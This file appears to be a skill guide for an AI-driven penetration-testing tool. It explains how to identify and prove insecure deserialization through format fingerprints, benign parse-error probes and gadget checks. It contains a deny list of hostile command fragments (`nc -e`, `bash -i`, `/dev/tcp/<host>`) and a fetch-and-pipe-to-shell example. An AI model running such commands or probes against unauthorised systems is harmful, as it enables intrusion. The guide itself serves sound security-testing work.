---
name: web-deserialization
description: Prove insecure deserialization the way rce is proven — format identification from magic bytes, a benign payload whose only effect is a parse error, gadget availability as a precondition to check, and what to report when no gadget is demonstrated. Use when a cookie, parameter, header or queue message carries a serialized object.
classes: deserialization
---

# Insecure deserialization

Proof requirement (`./bin/argus proof deserialization`): **the output of
`id; echo <nonce>`, with the nonce matching the probe.** The same requirement as
`rce`, graded by the same verifier, and nothing less: not a parse error naming a
deserializer, not a sleep that took five seconds, not a public chain that matches
the version. The identity line is context; the nonce is the part that cannot be
explained any other way. `proof.exec_marker` can only run that command, because
it builds it itself, and the matrix then reads the request around it: a record
whose command or body carries `rm -rf`, `nc -e`, `bash -i`, `useradd` or
`/dev/tcp/<host>` fails `proof command stayed benign` and drops to `supported` —
but that grep is a floor, not a net: `wget http://h/s | sh` is not on it.

## Identify the format first

| what you see | format | the entry it implies |
|---|---|---|
| `ac ed 00 05` raw, `rO0AB` in base64, or gzip then `rO0` | Java serialization | `readObject` on whatever is in the classpath |
| `00 01 00 00 00 ff ff ff ff`, `AAEAAAD/////`, a `__VIEWSTATE` field | .NET `BinaryFormatter`, ViewState | a binder that accepts any type; ViewState also needs the MAC off or the key known |
| `O:4:"User":2:{`, `a:2:{` | PHP `serialize()` | `__wakeup`, `__destruct`, `__toString` |
| `80 04 95`, `gASV`, `(dp0`, a `c` then `R` opcode pair | Python pickle | `__reduce__`: the payload names the callable |
| `04 08`, `BAh` | Ruby `Marshal` | `marshal_load`, and the loaded gems |
| `!!python/object/apply:`, `!ruby/object:` | YAML with tags | an unsafe loader |
| `{"$type":`, `{"@class":`, `{"@type":` | JSON with a type discriminator | polymorphic binding: the gadget is a class name |

Where to look: cookies, hidden fields, `state` and `data` parameters, cache keys,
queue bodies. `rO0` at the front of a cookie finds more of these than a scanner.

## The discriminating probe is a benign parse error

Whether the bytes reach a deserializer is answerable without a gadget — three
payloads, each measured with `http.differential` against the untouched value:

1. **one byte flipped mid-blob** — a deserializer complains of a corrupt stream
   or a bad checksum; a string comparison does not care
2. **a minimal valid object carrying nothing** — a pickle of `None` or
   `O:8:"stdClass":0:{}`: "it parsed, then failed" is not "it did not parse"
3. **a truncated stream** — the header and nothing after, reported as an
   unexpected end at a known offset

Read the shape, not the words: which of the three gives a distinct status, length
or stack frame tells you whether a deserializer is behind the parameter, and
which one. A frame naming `ObjectInputStream.readObject`, `unserialize()`,
`pickle.loads` or `BinaryFormatter.Deserialize` is a fingerprint, not a finding.

## Gadget availability is a precondition to check, not to assume

A deserializer with no reachable chain is a bug that is not yet a vulnerability,
and the check is cheap: the dependency list. A lockfile, a jar listing, a
`/META-INF/` or `/vendor/` leak, a bundle read with `recon.js_mine`, a version
through `knowledge.cve_lookup`. Write the preconditions down as a list — the way
the meta files under `scripts/exploits/` do — and check each before building
anything: "commons-collections 3.1 is on the classpath" is a precondition, "it is
Java" is not. Pickle, Ruby `Marshal` and an unsafe YAML loader are the exception:
the format calls a callable the payload names, so identification is reachability.

## A public chain usually drops a shell. Read it before you run it.

Generated chains, and payloads from writeups, hard-code a reverse shell, a `wget`
piped into a shell, or a write into a webroot more often than not. Put the marker
command in the generator's command argument and nothing else, then read how it is
graded: `proof.exec_marker` mints the nonce inside the call and substitutes only
the command text — 24 characters on unix, `id; echo ` plus a 15-char nonce — so a
blob can carry `{payload}` only where you set that length field yourself. A
base64 Java or pickle blob cannot, so build that one outside and record it with
`ledger.add_evidence kind=probe` carrying `nonce`, `command` and `stdout_span`,
graded the same way. A chain whose only output is a file it writes is a
`file-upload-rce`-shaped proof: intrusive tier, the file named with the nonce,
its deletion recorded. One you will use twice belongs under `scripts/exploits/`,
per `skills/extending-argus/SKILL.md`.

## Blind, and the trap the matrix will not catch for you

Most of these are blind by construction: the payload runs in a worker and the
response went out before it. A collector callback (`proof.oob_start`, your own
command posting the marker's output there, then `proof.oob_check`) or a file
read you can see are the honest routes; a sleep gadget is timing, never proof.
Then the trap: this class is graded by the command-output verifier, which looks
for the nonce in *any* observed text, the callback payload included. A DNS or
HTTP lookup carrying the nonce — which shows only that the stream was
deserialized — therefore grades `proven` while nothing executed. Record such a
callback as `ssrf` evidence, and let this class's evidence be output a command
produced. `identity output present` separates them, and is not required here.

## No gadget demonstrated is a result. Here is what it is.

A parameter shown to reach a deserializer, with no chain demonstrated, grades
`supported` and is recorded as a **candidate**, missing `nonce echoed by the
target` and — until `proof.exec_marker` has actually run — `benign marker command
declared` with it. That is a real line in a report: untrusted data reaches a
deserializer, the evidence is named (the three-payload differential, the stack
frame, the format), and the next session gets a bounded task, not a paragraph.

What it is not: code execution. Not reportable as RCE, not critical because a
chain is plausible, and "exploitable with a public gadget chain" without the
nonce is the sentence this system exists to keep out of reports. If the classpath
holds no reachable chain, say that too, with the dependency list you read.

## What does not count

- A base64 blob that decodes to a serialized object: the entry point.
- A stack trace naming a deserializer, or a 500 on a flipped byte: a fingerprint.
- A chain from `knowledge.chain_match`: a candidate on every result, since
  nothing checked its preconditions. A sleep gadget's delay: processing time.
